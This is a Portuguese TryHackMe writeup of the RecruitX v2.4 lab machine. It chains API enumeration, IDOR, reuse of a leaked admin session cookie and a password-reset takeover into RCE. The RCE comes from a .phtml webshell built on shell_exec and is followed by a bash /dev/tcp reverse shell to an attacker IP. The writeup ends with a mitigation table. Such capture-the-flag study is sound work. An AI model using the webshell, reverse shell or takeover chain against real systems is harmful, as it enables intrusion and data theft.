# RecruitX v2.4 — TryHackMe

**Plataforma:** TryHackMe
**Máquina:** RecruitX v2.4
**Dificuldade:** Não informada na sala
**SO:** Linux (Ubuntu, kernel 6.8.0-1017-aws)
**Data:** 20/07/2026
**Tags:** #recon #web #api #idor #rce #fileupload
**Status:** Foothold obtido como `www-data` (sem escalada a root documentada neste writeup)

## TL;DR

A aplicação é um sistema de recrutamento (**RecruitX v2.4**) rodando em stack LAMP (Apache + PHP + MySQL). O reconhecimento inicial revelou uma API que **lista seus próprios endpoints** (`/api/user`, `/api/jobs`, `/api/applications`), o que já facilita bastante o mapeamento do backend. A partir daí, um **IDOR** em `profile.php?id=` permitiu visualizar o perfil de outros usuários apenas trocando o parâmetro `id` na URL — incluindo o de uma administradora, cujo cookie de sessão (`PHPSESSID`) ficou exposto no HTML renderizado e pôde ser reutilizado diretamente em requisições `curl`.

Combinando o IDOR na API (`/api/user?id=`) para enumerar e-mails de usuários com o fluxo de **reset de senha** (`reset.php`), foi possível assumir a conta da administradora sem quebrar nenhuma senha. Isso deu acesso a um painel administrativo com funcionalidade de **upload de arquivos**, cujo filtro de extensão bloqueava `.php` mas não bloqueava `.phtml` — uma extensão que o Apache também interpreta como PHP. O upload de um arquivo `.phtml` contendo `shell_exec()` resultou em **RCE** como `www-data`, confirmado via `whoami`/`id`/`uname -a`, seguido de leitura de `/etc/passwd` e obtenção de uma reverse shell interativa.

**Cadeia de ataque:** Enumeração de API/IDOR → Vazamento de cookie de sessão da admin → Account takeover via reset de senha → Bypass de filtro de upload (`.phtml`) → RCE (www-data) → Reverse shell

---

## 1. Reconhecimento

### 1.1 Varredura de portas

```
nmap -sV -sC -p- 10.64.150.106
```

Identificadas 4 portas abertas:

| Porta | Serviço | Versão |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache httpd 2.4.58 |
| 3306 | MySQL | — |
| 8080 | HTTP | Apache httpd 2.4.58 |

### 1.2 Fingerprint do servidor web

```
curl -I http://10.64.150.106
```

Confirma a versão do Apache e retorna um cookie de sessão: `PHPSESSID=bhgauo9udn2lo1gd3fohalvpn1`.

### 1.3 Enumeração de diretórios com Gobuster

```
gobuster dir -u http://10.64.150.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Diretórios/arquivos encontrados:

```
/.php
/index.php
/login.php
/register.php
/profile.php
/jobs.php
/uploads
/data
/admin
/test
/includes
/api
/logout.php
/config
/dashboard.php
/reset.php
```

Vários pontos de interesse: `/api`, `/admin`, `/uploads` e `/reset.php` — todos explorados nas próximas etapas.

### 1.4 Enumeração da API

```
curl http://10.65.140.154/api/
```

```json
{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}
```

A própria API expõe a lista dos seus endpoints internos. Isso já é um problema de design — um cliente não deveria conseguir descobrir rotas internas apenas consultando a raiz da API; isso reduz drasticamente o esforço de enumeração de um atacante.

---

## 2. IDOR e account takeover

### 2.1 IDOR em `profile.php`

Ao acessar meu próprio perfil autenticado, a URL trazia `id=6`. Trocando o parâmetro para `id=1`, obtive acesso ao perfil e às informações de **Sarah Mitchell**, administradora do sistema (`s.mitchell@recruitx.thm`) — nenhuma verificação de que o `id` da URL pertence ao usuário autenticado.

Inspecionando a página, foi possível capturar o cookie de sessão da administradora: `PHPSESSID=sbt3vd2o09tfr36am59qkm618d`.

Reutilizando esse cookie diretamente em uma requisição `curl` contra `id=1`, confirma-se o acesso à conta:

```
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s -b "PHPSESSID=sbt3vd2o09tfr36am59qkm618d" "http://10.65.184.108/profile.php?id=1" | grep "fw-semibold"
                        <div class="fw-semibold mt-1">Sarah Mitchell</div>
                        <div class="fw-semibold mt-1 mono">s.mitchell@recruitx.thm</div>
                        <div class="fw-semibold mt-1">March 24, 2026</div>
```

### 2.2 Enumeração de usuários via API

O mesmo problema de IDOR existe no endpoint `/api/user?id=`, sem exigir autenticação:

```
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s "http://10.65.184.108/api/user?id=2"
{"id":2,"name":"James Crawford","email":"j.crawford@recruitx.thm","role":"hiring_manager","created":"2026-03-24"}
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s "http://10.65.184.108/api/user?id=3"
{"id":3,"name":"Priya Desai","email":"p.desai@recruitx.thm","role":"hiring_manager","created":"2026-03-24"}
┌──(gabriel㉿gabriel)-[~]
└─$ curl -s "http://10.65.184.108/api/user?id=4"
{"id":4,"name":"Tom Beckett","email":"t.beckett@recruitx.thm","role":"candidate","created":"2026-03-24"}
```

Isso permite enumerar e-mails e papéis (`role`) de todos os usuários do sistema — incluindo o e-mail da administradora, já identificado na etapa anterior.

### 2.3 Account takeover via `reset.php`

Com o e-mail da administradora em mãos (`s.mitchell@recruitx.thm`), usei o fluxo de reset de senha em `/reset.php` para trocar a senha da conta e efetuar login como administradora — sem precisar quebrar nenhuma credencial.

---

## 3. RCE via bypass de filtro de upload

### 3.1 Identificando o bypass de extensão

Já autenticado como administradora, o painel de upload ficou acessível. Inspecionando o front-end, o filtro de extensões bloqueia `.php`, mas aceita `.txt` — e, criticamente, também aceita `.phtml`, uma extensão que o Apache também interpreta como script PHP por padrão.

Arquivo enviado (`exec.phtml`):

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### 3.2 Confirmando a execução remota de comandos

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=whoami"
<pre>www-data
</pre>
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=hostname"
<pre>recruitx-prod
</pre>
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=uname+-a"
<pre>Linux recruitx-prod 6.8.0-1017-aws #18-Ubuntu SMP Wed Oct  2 20:17:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
</pre>
```

RCE confirmado como `www-data`. Em seguida, leitura de arquivos sensíveis do sistema:

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=cat+/etc/passwd" | grep -v "nologin"
<pre>root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
mysql:x:115:123:MySQL Server,,,:/nonexistent:/bin/false
qa:x:1001:1001::/home/qa:/bin/bash
</pre>
```

### 3.3 Reverse shell

Listener em um terminal:

```
nc -lvnp 4444
```

Disparo do reverse shell via a webshell já enviada:

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ curl "http://10.65.184.108/uploads/documents/exec.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.155.175/4444+0>%261'"
```

Shell recebida no listener:

```
┌──(gabriel㉿gabriel)-[~/Documents/Study]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.155.175] from (UNKNOWN) [10.65.184.108] 52768
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
www-data@recruitx-prod:/var/www/recruitx/uploads/documents$
```

Este writeup foi encerrado neste ponto (acesso interativo como `www-data`), sem uma etapa de escalada de privilégios a root documentada.

---

## 4. Causa raiz e mitigação

| # | Vulnerabilidade | Causa raiz | Mitigação |
|---|---|---|---|
| 1 | API auto-descritiva (enumeração de endpoints) | A raiz de `/api/` retorna a lista de todos os endpoints internos sem exigir autenticação | Nunca expor um "índice" de rotas internas publicamente; exigir autenticação/autorização para descoberta de endpoints, ou removê-la do build de produção |
| 2 | IDOR em `profile.php` e `/api/user` | O `id` informado na URL/query string é usado diretamente para buscar e renderizar dados de qualquer usuário, sem checar se pertence à sessão autenticada | Validar no backend se o recurso solicitado pertence ao usuário autenticado (ou se ele tem permissão explícita); usar identificadores não sequenciais (UUID) para dificultar enumeração |
| 3 | Vazamento de cookie de sessão no HTML | O `PHPSESSID` de outro usuário ficou exposto/reutilizável ao acessar o perfil de terceiros via IDOR | Cookies de sessão devem ter os atributos `HttpOnly`, `Secure` e `SameSite`; a sessão nunca deveria "vazar" simplesmente por visualizar dados de outro usuário via IDOR — isso indica problema mais profundo de design de sessão |
| 4 | Account takeover via reset de senha | O fluxo de `/reset.php` permite iniciar a redefinição de senha de qualquer conta apenas sabendo o e-mail (obtido via IDOR na API) | Exigir confirmação por posse do e-mail (link/token único enviado à caixa de entrada real), rate limiting e nunca permitir enumeração de e-mails válidos por API pública |
| 5 | Bypass de filtro de upload por extensão (`.phtml`) | O filtro de upload bloqueia apenas `.php`, mas ignora outras extensões (`.phtml`, `.php5`, `.pht` etc.) que o Apache também interpreta como PHP | Usar whitelist estrita de extensões e validação de conteúdo (magic bytes/MIME real), configurar o Apache/`AddHandler` para não interpretar extensões além da estritamente necessária, e servir uploads fora do webroot ou sem permissão de execução |

---

## 5. Lições aprendidas

- Uma API que expõe seus próprios endpoints na raiz facilita demais o trabalho de reconhecimento de um atacante — reduz o mapeamento de superfície de ataque a um único `curl`.
- IDOR não é "só" sobre visualizar dados de outro usuário: neste caso, ele encadeou diretamente para vazamento de cookie de sessão e, depois, para account takeover via reset de senha — pequenas falhas se combinam em cadeias de impacto muito maior.
- Blacklist de extensão (bloquear `.php` mas esquecer `.phtml`, `.php5`, `.pht`) é uma abordagem frágil; sempre preferir whitelist e validação de conteúdo real do arquivo.
- Saber que o backend é PHP evitou perder tempo tentando bypasses voltados a Node ou Python — `.phtml` é uma variante pouco lembrada, mas plenamente executável pelo Apache por padrão.
- Reconhecimento não é só "coletar por coletar": cada diretório, endpoint e cookie encontrado nesta fase foi reaproveitado nas etapas seguintes do ataque.
